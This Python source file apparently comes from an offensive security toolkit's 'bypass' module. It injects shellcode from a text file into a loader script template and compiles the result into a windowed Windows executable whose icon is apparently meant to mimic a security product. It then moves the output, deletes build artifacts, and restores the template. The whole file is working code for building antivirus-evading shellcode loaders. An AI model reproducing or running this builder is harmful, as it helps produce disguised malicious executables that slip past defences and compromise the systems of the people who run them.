import os
from module.bypass import config


class py_loader:
    def run_script(self):
        file_py = os.path.basename(__file__)# file.py
        file_exe = os.path.split(__file__)[-1].split(".")[0]+".exe"# file.exe
        filepath = "./module/bypass/script/"+file_py
        with open("./module/bypass/shellcode.txt", "r", encoding="utf-8") as fsc:
            sc = fsc.read()
            sc = sc.replace("\n", "")

        with open("./module/bypass/script/py_loader.py", "r", encoding="utf-8") as fs:
            script = fs.read()
            script = script.replace("shellcode = \"\"", 'shellcode = \"'+sc+"\"")

        with open("./module/bypass/script/py_loader.py", "w", encoding="utf-8") as fw:
            fw.write(script)


        os.system(config.python + " -Fw -i ./module/bypass/script/360.ico " + filepath)
        os.system("move .\/dist\/"+file_exe+" .\/module\/bypass\/exe")

        print("    \033[0;36;40mbypass finished: /module/bypass/exe/"+file_exe+"\033[0m")
        os.system("del *.spec")
        os.system("rd /S/Q build")
        os.system("rd /S/Q dist")
        os.system("rd /S/Q .idea")
        os.system("rd /S/Q __pycache__")

        print("    \033[0;35;40mTempFile cleaned!\033[0m")


        with open("./module/bypass/script/py_loader.py", "r", encoding="utf-8") as fs:
            script = fs.read()
            script = script.replace('shellcode = \"'+sc+"\"", "shellcode = \"\"")

        with open("./module/bypass/script/py_loader.py", "w", encoding="utf-8") as fw:
            fw.write(script)

        print("    \033[0;35;40mshellcode script Already initialized!\033[0m")
